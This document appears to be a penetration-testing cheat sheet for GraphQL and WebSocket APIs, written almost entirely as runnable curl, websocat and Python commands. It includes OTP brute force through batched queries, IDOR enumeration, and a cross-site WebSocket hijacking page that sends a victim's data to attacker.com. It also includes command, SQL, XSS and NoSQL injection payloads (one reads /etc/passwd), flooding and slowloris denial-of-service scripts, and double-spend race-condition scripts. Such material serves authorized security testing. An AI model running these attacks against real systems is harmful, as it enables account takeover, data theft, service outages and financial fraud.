# GraphQL & WebSocket Security Testing

## Part 1: GraphQL Testing

### Discovery

```bash
# Common GraphQL endpoints
GQL_PATHS=(
    "/graphql" "/gql" "/api/graphql" "/api/gql"
    "/v1/graphql" "/v2/graphql"
    "/graphql/v1" "/graphql/v2"
    "/query" "/api/query"
    "/graphql/console" "/graphql/playground"
    "/graphiql" "/altair"
    "/explorer" "/api/explorer"
)

for path in "${GQL_PATHS[@]}"; do
    STATUS=$(curl -sk -o /dev/null -w "%{http_code}" \
        -X POST "https://$TARGET$path" \
        -H "Content-Type: application/json" \
        -d '{"query":"{ __typename }"}')
    [ "$STATUS" != "404" ] && echo "$path: $STATUS"
done

# Detect GraphQL from error messages
# Send invalid query — GraphQL returns specific error format:
curl -sk -X POST "https://$TARGET/api" \
    -H "Content-Type: application/json" \
    -d '{"query":"{"}'
# GraphQL error: {"errors":[{"message":"Syntax Error...","locations":[...]}]}

# GET-based GraphQL (some implementations)
curl -sk "https://$TARGET/graphql?query=%7B__typename%7D"

# Check for GraphQL via WebSocket (subscriptions)
# ws://target/graphql or wss://target/graphql
# Protocol: graphql-ws or graphql-transport-ws
```

### Introspection Attacks

```bash
# Full schema introspection query
curl -sk -X POST "https://$TARGET/graphql" \
    -H "Content-Type: application/json" \
    -d '{"query":"{ __schema { queryType { name } mutationType { name } subscriptionType { name } types { name kind description fields(includeDeprecated: true) { name description args { name description type { name kind ofType { name kind } } } type { name kind ofType { name kind ofType { name kind ofType { name } } } } } inputFields { name description type { name kind ofType { name kind } } } enumValues(includeDeprecated: true) { name description } } directives { name description locations args { name description type { name kind ofType { name kind } } } } } }"}' | python3 -m json.tool

# Shorter introspection (types and fields only)
curl -sk -X POST "https://$TARGET/graphql" \
    -H "Content-Type: application/json" \
    -d '{"query":"{ __schema { types { name fields { name type { name } } } } }"}' | jq '.data.__schema.types[] | select(.name | startswith("__") | not)'

# List all queries
curl -sk -X POST "https://$TARGET/graphql" \
    -H "Content-Type: application/json" \
    -d '{"query":"{ __schema { queryType { fields { name description args { name type { name } } } } } }"}' | jq '.data.__schema.queryType.fields[]'

# List all mutations
curl -sk -X POST "https://$TARGET/graphql" \
    -H "Content-Type: application/json" \
    -d '{"query":"{ __schema { mutationType { fields { name description args { name type { name kind ofType { name } } } } } } }"}' | jq '.data.__schema.mutationType.fields[]'
```

### Introspection Disabled — Bypass Techniques

```bash
# 1. Field suggestion exploitation
# Send a query with a typo — some implementations suggest valid field names
curl -sk -X POST "https://$TARGET/graphql" \
    -H "Content-Type: application/json" \
    -d '{"query":"{ usre { id } }"}'
# Response: "Did you mean 'user'?"

# Automate field discovery via suggestions:
WORDLIST=("user" "users" "account" "accounts" "admin" "profile" "order" "orders" "payment" "transaction" "transfer" "balance" "card" "notification" "message" "setting" "config" "token" "session" "login" "register" "password" "otp" "verify" "bank" "beneficiary" "statement")

for word in "${WORDLIST[@]}"; do
    RESPONSE=$(curl -sk -X POST "https://$TARGET/graphql" \
        -H "Content-Type: application/json" \
        -d "{\"query\":\"{ ${word}XXXXX { id } }\"}" 2>/dev/null)
    SUGGESTIONS=$(echo "$RESPONSE" | grep -o "Did you mean.*" | head -1)
    [ -n "$SUGGESTIONS" ] && echo "$word → $SUGGESTIONS"
done

# 2. __type query (sometimes allowed when __schema is blocked)
curl -sk -X POST "https://$TARGET/graphql" \
    -H "Content-Type: application/json" \
    -d '{"query":"{ __type(name: \"User\") { name fields { name type { name } } } }"}'

# 3. Try introspection via GET (may bypass POST-only restrictions)
curl -sk "https://$TARGET/graphql?query=%7B__schema%7BqueryType%7Bname%7D%7D%7D"

# 4. Try with different Content-Type
curl -sk -X POST "https://$TARGET/graphql" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    -d 'query={ __schema { types { name } } }'
```

### Authorization Testing

```bash
# Per-field authorization bypass
# If you can query your own user, try accessing fields meant for admins:
curl -sk -X POST "https://$TARGET/graphql" \
    -H "Authorization: Bearer $USER_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"query":"{ me { id email role isAdmin internalNotes creditScore riskRating } }"}'

# Nested object access (traverse relationships)
# user → orders → otherUser's orders
curl -sk -X POST "https://$TARGET/graphql" \
    -H "Authorization: Bearer $USER_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"query":"{ user(id: \"OTHER_USER_ID\") { id email orders { id amount status } } }"}'

# Mutation without proper auth
# Try admin mutations with regular user token:
curl -sk -X POST "https://$TARGET/graphql" \
    -H "Authorization: Bearer $USER_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"query":"mutation { updateUserRole(userId: \"MY_ID\", role: ADMIN) { id role } }"}'

# Access control on connections/edges
# Pagination may leak total count or items from other users:
curl -sk -X POST "https://$TARGET/graphql" \
    -H "Authorization: Bearer $USER_TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"query":"{ allTransactions(first: 100) { totalCount edges { node { id amount userId } } } }"}'
```

### IDOR via GraphQL

```bash
# Node interface (Relay specification)
# Global IDs are base64-encoded: base64("TypeName:id")
echo -n "User:1" | base64  # VXNlcjox
echo -n "User:2" | base64  # VXNlcjoy

# Query other users via node interface:
curl -sk -X POST "https://$TARGET/graphql" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"query":"{ node(id: \"VXNlcjoy\") { ... on User { id email balance } } }"}'

# Enumerate IDs:
for i in $(seq 1 100); do
    ID=$(echo -n "User:$i" | base64)
    RESULT=$(curl -sk -X POST "https://$TARGET/graphql" \
        -H "Authorization: Bearer $TOKEN" \
        -H "Content-Type: application/json" \
        -d "{\"query\":\"{ node(id: \\\"$ID\\\") { ... on User { id email } } }\"}" | jq -r '.data.node.email // empty')
    [ -n "$RESULT" ] && echo "User:$i → $RESULT"
done

# Direct ID parameter:
curl -sk -X POST "https://$TARGET/graphql" \
    -H "Authorization: Bearer $TOKEN" \
    -H "Content-Type: application/json" \
    -d '{"query":"{ account(id: \"OTHER_ACCOUNT_ID\") { balance transactions { amount } } }"}'
```

### Query Batching (Brute Force Bypass)

```bash
# Send multiple queries in one request to bypass rate limiting
# Useful for: OTP brute force, user enumeration, password spraying

# Array batching:
curl -sk -X POST "https://$TARGET/graphql" \
    -H "Content-Type: application/json" \
    -d '[
        {"query":"mutation { login(phone: \"+62812xxx\", otp: \"000001\") { token } }"},
        {"query":"mutation { login(phone: \"+62812xxx\", otp: \"000002\") { token } }"},
        {"query":"mutation { login(phone: \"+62812xxx\", otp: \"000003\") { token } }"},
        {"query":"mutation { login(phone: \"+62812xxx\", otp: \"000004\") { token } }"},
        {"query":"mutation { login(phone: \"+62812xxx\", otp: \"000005\") { token } }"}
    ]'
# 5 OTP attempts in 1 request — rate limiter may count as 1 request

# Alias batching (single query, multiple operations):
curl -sk -X POST "https://$TARGET/graphql" \
    -H "Content-Type: application/json" \
    -d '{"query":"mutation { a1: login(otp: \"000001\") { token } a2: login(otp: \"000002\") { token } a3: login(otp: \"000003\") { token } a4: login(otp: \"000004\") { token } a5: login(otp: \"000005\") { token } }"}'

# Generate batch for full OTP brute force:
python3 -c "
import json
queries = []
for i in range(0, 1000000, 100):
    batch = []
    for j in range(100):
        otp = f'{i+j:06d}'
        batch.append({'query': f'mutation {{ a{j}: login(otp: \"{otp}\") {{ token }} }}'})
    # Send batch...
    print(f'Batch {i//100}: OTPs {i:06d}-{i+99:06d}')
" | head -20
```

### Nested Query DoS (Resource Exhaustion)

```bash
# Depth-based DoS (if no query depth limiting):
curl -sk -X POST "https://$TARGET/graphql" \
    -H "Content-Type: application/json" \
    -d '{"query":"{ user(id:\"1\") { friends { friends { friends { friends { friends { friends { friends { friends { friends { friends { name } } } } } } } } } } } }"}'

# Width-based DoS (many fields):
curl -sk -X POST "https://$TARGET/graphql" \
    -H "Content-Type: application/json" \
    -d '{"query":"{ a1: users { id } a2: users { id } a3: users { id } a4: users { id } a5: users { id } a6: users { id } a7: users { id } a8: users { id } a9: users { id } a10: users { id } }"}'

# Fragment-based amplification:
curl -sk -X POST "https://$TARGET/graphql" \
    -H "Content-Type: application/json" \
    -d '{"query":"query { users { ...F1 } } fragment F1 on User { friends { ...F2 } } fragment F2 on User { friends { ...F3 } } fragment F3 on User { friends { id name email } }"}'

# Measure response time to detect depth/complexity limits:
for depth in 2 4 6 8 10 15 20; do
    NESTED=$(python3 -c "print('{ user ' + '{ friends ' * $depth + '{ id } ' + '} ' * $depth + '}')")
    TIME=$(curl -sk -X POST "https://$TARGET/graphql" \
        -H "Content-Type: application/json" \
        -d "{\"query\":\"$NESTED\"}" \
        -w "%{time_total}" -o /dev/null)
    echo "Depth $depth: ${TIME}s"
done
```

### Information Disclosure

```bash
# Verbose error messages
curl -sk -X POST "https://$TARGET/graphql" \
    -H "Content-Type: application/json" \
    -d '{"query":"{ user(id: \"invalid\") { nonexistentField } }"}'
# May reveal: field names, type names, resolver paths, stack traces

# Debug mode detection
curl -sk -X POST "https://$TARGET/graphql" \
    -H "Content-Type: application/json" \
    -d '{"query":"{ __typename }","extensions":{"debug":true}}'

# Tracing (Apollo Server)
curl -sk -X POST "https://$TARGET/graphql" \
    -H "Content-Type: application/json" \
    -H "X-Apollo-Tracing: 1" \
    -d '{"query":"{ users { id } }"}'
# May return resolver execution times and paths
```

### GraphQL File Upload

```bash
# Multipart request specification (graphql-upload)
curl -sk -X POST "https://$TARGET/graphql" \
    -F 'operations={"query":"mutation($file: Upload!) { uploadFile(file: $file) { url } }","variables":{"file":null}}' \
    -F 'map={"0":["variables.file"]}' \
    -F '0=@malicious.svg'

# Test for:
# - Unrestricted file types (upload .html, .svg with XSS, .php)
# - Path traversal in filename
# - SSRF via URL-based upload
# - File size limits (DoS via large upload)
```

---

## Part 2: WebSocket Testing

### Discovery

```bash
# Common WebSocket endpoints
WS_PATHS=(
    "/ws" "/websocket" "/socket" "/realtime"
    "/ws/v1" "/api/ws" "/api/websocket"
    "/socket.io/" "/sockjs/"
    "/cable"  # ActionCable (Rails)
    "/hub"    # SignalR
    "/graphql" # GraphQL subscriptions
    "/notifications" "/events" "/stream"
    "/chat" "/live" "/feed"
)

# Check for WebSocket upgrade support
for path in "${WS_PATHS[@]}"; do
    STATUS=$(curl -sk -o /dev/null -w "%{http_code}" \
        -H "Upgrade: websocket" \
        -H "Connection: Upgrade" \
        -H "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==" \
        -H "Sec-WebSocket-Version: 13" \
        "https://$TARGET$path")
    # 101 = WebSocket upgrade successful
    # 400 = WebSocket endpoint but missing params
    # 426 = Upgrade Required (confirms WS support)
    [ "$STATUS" != "404" ] && [ "$STATUS" != "403" ] && echo "$path: $STATUS"
done

# Socket.IO detection (uses polling fallback)
curl -sk "https://$TARGET/socket.io/?EIO=4&transport=polling"
# Returns: 0{"sid":"...","upgrades":["websocket"],...}
```

### Tools Setup

```bash
# websocat (recommended — versatile)
brew install websocat
# Or: cargo install websocat

# wscat (Node.js)
npm install -g wscat

# Basic connection:
websocat "wss://$TARGET/ws" -H "Authorization: Bearer $TOKEN"
wscat -c "wss://$TARGET/ws" -H "Authorization: Bearer $TOKEN"
```

### Authentication Testing

```bash
# 1. Connect without any auth
websocat "wss://$TARGET/ws"
# If connection succeeds → missing auth (HIGH)

# 2. Token in URL (leaks via referrer, logs)
websocat "wss://$TARGET/ws?token=$JWT"
# Finding: token in URL = credential exposure risk

# 3. Auth only at connection time (not per-message)
# Connect with valid token, then:
# - Does the server validate token expiry on each message?
# - Can you keep using the connection after token expires?
# - Can you send messages after logout?

# 4. Missing origin validation (Cross-Site WebSocket Hijacking)
# Connect from different origin:
websocat "wss://$TARGET/ws" \
    -H "Origin: https://evil.com" \
    -H "Cookie: session=$VICTIM_SESSION"
# If connection succeeds with evil origin → CSWSH vulnerability

# 5. Protocol-level auth bypass
# Some implementations check auth in HTTP upgrade but not in WS frames
websocat "wss://$TARGET/ws" -H "Authorization: Bearer invalid_token"
# If upgrade succeeds → auth not properly validated
```

### Cross-Site WebSocket Hijacking (CSWSH)

```html
<!-- Proof of concept HTML page hosted on attacker domain -->
<script>
// If target doesn't validate Origin header, this works:
var ws = new WebSocket("wss://target.com/ws");
// Browser sends victim's cookies automatically!

ws.onopen = function() {
    // Subscribe to victim's notifications
    ws.send(JSON.stringify({action: "subscribe", channel: "user_notifications"}));
};

ws.onmessage = function(event) {
    // Exfiltrate received data
    fetch("https://attacker.com/collect", {
        method: "POST",
        body: event.data
    });
};
</script>
```

```bash
# Test CSWSH:
# 1. Check if Origin header is validated
websocat "wss://$TARGET/ws" -H "Origin: https://evil.com"
# If 403 → Origin validated (good)
# If 101 → No Origin check (CSWSH possible)

# 2. Check if cookies are sufficient for auth (no additional token needed)
websocat "wss://$TARGET/ws" -H "Cookie: session=$SESSION_COOKIE" -H "Origin: https://evil.com"
```

### Injection via WebSocket

```bash
# SQL injection in message parameters
websocat "wss://$TARGET/ws" <<< '{"action":"search","query":"test\" OR 1=1--"}'
websocat "wss://$TARGET/ws" <<< '{"action":"getUser","id":"1 UNION SELECT password FROM users--"}'

# Command injection
websocat "wss://$TARGET/ws" <<< '{"action":"ping","host":"127.0.0.1; id"}'
websocat "wss://$TARGET/ws" <<< '{"action":"export","filename":"report.pdf; cat /etc/passwd"}'

# XSS via WebSocket (if messages rendered in other users' browsers)
websocat "wss://$TARGET/ws" <<< '{"action":"sendMessage","text":"<img src=x onerror=alert(document.cookie)>"}'

# NoSQL injection
websocat "wss://$TARGET/ws" <<< '{"action":"find","filter":{"$gt":""}}'

# Template injection
websocat "wss://$TARGET/ws" <<< '{"action":"render","template":"{{7*7}}"}'
```

### Authorization Bypass

```bash
# 1. Subscribe to other users' channels
# Normal: subscribe to your own notifications
websocat "wss://$TARGET/ws" <<< '{"action":"subscribe","channel":"user_123_notifications"}'
# Attack: subscribe to another user's channel
websocat "wss://$TARGET/ws" <<< '{"action":"subscribe","channel":"user_456_notifications"}'
# If you receive their notifications → authorization bypass (HIGH)

# 2. Message manipulation (send as another user)
websocat "wss://$TARGET/ws" <<< '{"action":"sendMessage","from":"admin","to":"user","text":"Your OTP is 123456"}'

# 3. Admin actions via WebSocket
websocat "wss://$TARGET/ws" <<< '{"action":"admin.listUsers"}'
websocat "wss://$TARGET/ws" <<< '{"action":"admin.deleteUser","userId":"target"}'

# 4. Channel enumeration
for i in $(seq 1 100); do
    echo "{\"action\":\"subscribe\",\"channel\":\"user_${i}_balance\"}"
done | websocat "wss://$TARGET/ws"

# 5. Privilege escalation via message type
websocat "wss://$TARGET/ws" <<< '{"type":"admin","action":"getConfig"}'
websocat "wss://$TARGET/ws" <<< '{"role":"admin","action":"listSecrets"}'
```

### DoS via WebSocket

```bash
# 1. Message flooding (no rate limiting)
python3 -c "
import asyncio, websockets, json
async def flood():
    async with websockets.connect('wss://$TARGET/ws') as ws:
        for i in range(10000):
            await ws.send(json.dumps({'action':'ping','id':i}))
asyncio.run(flood())
"

# 2. Large frame attack
python3 -c "
import asyncio, websockets
async def large_frame():
    async with websockets.connect('wss://$TARGET/ws') as ws:
        await ws.send('A' * 10000000)  # 10MB message
asyncio.run(large_frame())
"

# 3. Connection exhaustion
# Open many WebSocket connections without closing:
for i in $(seq 1 1000); do
    websocat "wss://$TARGET/ws" --no-close &
done
# Check if server stops accepting new connections

# 4. Slowloris-style (send partial frames slowly)
python3 -c "
import socket, ssl, time
sock = socket.socket()
sock = ssl.wrap_socket(sock)
sock.connect(('$TARGET', 443))
# Send WebSocket upgrade
sock.send(b'GET /ws HTTP/1.1\r\nHost: $TARGET\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\nSec-WebSocket-Version: 13\r\n\r\n')
# Read upgrade response
sock.recv(4096)
# Send partial frame, never complete it
while True:
    sock.send(b'\x81')  # Text frame, no length yet
    time.sleep(30)
"
```

### Socket.IO Specific Testing

```bash
# Socket.IO uses a specific protocol on top of WebSocket
# Handshake via polling first, then upgrades to WS

# 1. Get session ID
SID=$(curl -sk "https://$TARGET/socket.io/?EIO=4&transport=polling" | sed 's/^0//' | jq -r '.sid')
echo "Session: $SID"

# 2. Connect via WebSocket with SID
websocat "wss://$TARGET/socket.io/?EIO=4&transport=websocket&sid=$SID"
# Send: 2probe (ping)
# Expect: 3probe (pong)
# Send: 5 (upgrade)

# 3. Emit events
# Socket.IO message format: 4<event_id>[event_name, ...args]
# Example: 42["chat message","hello"]
websocat "wss://$TARGET/socket.io/?EIO=4&transport=websocket&sid=$SID" <<< '42["getBalance",{"userId":"OTHER_USER"}]'

# 4. Listen to all events (some servers broadcast too much)
# Just connect and log everything received
websocat "wss://$TARGET/socket.io/?EIO=4&transport=websocket&sid=$SID" | tee ws_log.txt
```

---

## Race Conditions (Bonus — Applies to Both)

### Turbo Intruder Pattern (Burp)

```python
# Turbo Intruder script for race conditions
# Use with Burp Suite's Turbo Intruder extension

def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                          concurrentConnections=30,
                          requestsPerConnection=100,
                          pipeline=False)

    # Queue same request multiple times for race condition
    for i in range(20):
        engine.queue(target.req, gate='race1')

    # Open gate — all requests fire simultaneously
    engine.openGate('race1')
    engine.complete(timeout=10)

def handleResponse(req, interesting):
    table.add(req)
```

### Parallel curl for Race Conditions

```bash
# Double-spend test (financial transactions)
# Fire multiple identical transfer requests simultaneously:

# Method 1: GNU parallel
seq 1 10 | parallel -j10 "curl -sk -X POST 'https://$TARGET/api/v1/transfer' \
    -H 'Authorization: Bearer $TOKEN' \
    -H 'Content-Type: application/json' \
    -d '{\"to\":\"ACC123\",\"amount\":100}' \
    -w 'HTTP %{http_code} in %{time_total}s\n' -o /dev/null"

# Method 2: Background processes with sync
for i in $(seq 1 10); do
    curl -sk -X POST "https://$TARGET/api/v1/transfer" \
        -H "Authorization: Bearer $TOKEN" \
        -H "Content-Type: application/json" \
        -d '{"to":"ACC123","amount":100}' \
        -w "Request $i: HTTP %{http_code}\n" -o /dev/null &
done
wait

# Method 3: Python asyncio (most precise timing)
python3 << 'EOF'
import asyncio, aiohttp, json

async def race():
    url = f"https://{TARGET}/api/v1/transfer"
    headers = {"Authorization": f"Bearer {TOKEN}", "Content-Type": "application/json"}
    data = json.dumps({"to": "ACC123", "amount": 100})

    async with aiohttp.ClientSession() as session:
        tasks = [session.post(url, headers=headers, data=data, ssl=False) for _ in range(10)]
        responses = await asyncio.gather(*tasks)
        for i, resp in enumerate(responses):
            print(f"Request {i}: {resp.status}")

asyncio.run(race())
EOF

# What to check after race condition test:
# - Did balance decrease by 100 (correct) or 1000 (race condition)?
# - Were multiple transactions created?
# - Did any request get a different response code?
```

---

## Severity Guide

| Finding | Severity | Context |
|---------|----------|---------|
| GraphQL introspection enabled (prod) | Medium | Schema disclosure, aids further attacks |
| IDOR via GraphQL node/ID | High-Critical | Depends on data accessed |
| Batch query bypasses rate limiting on OTP | Critical | Account takeover via OTP brute force |
| Nested query DoS (no depth limit) | Medium | Service disruption |
| Mutation without authorization | Critical | Unauthorized data modification |
| Per-field auth bypass (admin fields accessible) | High | Privilege escalation |
| WebSocket missing authentication | High-Critical | Unauthorized data access |
| Cross-Site WebSocket Hijacking | High | Session hijacking from victim's browser |
| WebSocket channel authorization bypass | High | Access other users' real-time data |
| SQL injection via WebSocket | Critical | Database compromise |
| WebSocket no rate limiting | Low-Medium | DoS potential |
| Token in WebSocket URL | Low | Credential exposure in logs |
| Race condition on financial transaction | Critical | Double-spend, financial loss |
